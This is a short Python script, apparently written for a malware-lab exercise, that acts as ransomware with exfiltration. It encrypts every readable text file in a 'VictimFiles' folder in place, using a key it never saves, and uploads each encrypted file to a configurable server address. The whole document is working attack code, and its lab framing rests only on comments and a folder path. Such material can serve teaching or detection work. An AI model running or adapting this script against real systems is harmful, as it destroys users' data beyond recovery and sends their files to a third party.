import os
import requests
from cryptography.fernet import Fernet
from datetime import datetime

# Victim files path on Drive C
VICTIM_FOLDER = "C:\\MalwareLab\\VictimFiles"
LOG_FILE = "C:\\MalwareLab\\malware_log.txt"

# ===== IMPORTANT: Configure this with your SERVER LAPTOP IP =====
# On SERVER laptop, run: ipconfig (Windows) and find IPv4 Address
# Example: "192.168.x.x" or "10.x.x.x"
SERVER_IP = "172.23.131.0"  # <-- CHANGE THIS to your server's IP
API_URL = f"http://{SERVER_IP}:5000/upload"

# Generate encryption key (simulation)
key = Fernet.generate_key()
cipher = Fernet(key)

def log(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} — {message}\n")

log("Simulation started!")

for filename in os.listdir(VICTIM_FOLDER):
    file_path = os.path.join(VICTIM_FOLDER, filename)

    if os.path.isfile(file_path):
        try:
            # Try reading as text first
            with open(file_path, "r", encoding="utf-8") as file:
                data = file.read()
        except (UnicodeDecodeError, PermissionError):
            # If it's already encrypted or binary, skip it
            log(f"Skipped file (binary/encrypted): {filename}")
            continue

        # Encrypt file content
        encrypted_data = cipher.encrypt(data.encode())
        with open(file_path, "wb") as file:
            file.write(encrypted_data)

        log(f"Encrypted file: {filename}")

        # Send encrypted data
        try:
            # Upload file using multipart/form-data (proper file upload)
            with open(file_path, "rb") as upload_file:
                files = {"file": (filename, upload_file)}
                response = requests.post(API_URL, files=files)
                response.raise_for_status()  # Raise exception for bad status codes
            log(f"Transfer success: {filename}")
        except Exception as e:
            log(f"Transfer FAILED: {filename} — {str(e)}")

log("Simulation Finished")
print("Files Encrypted + Transfer Attempted")
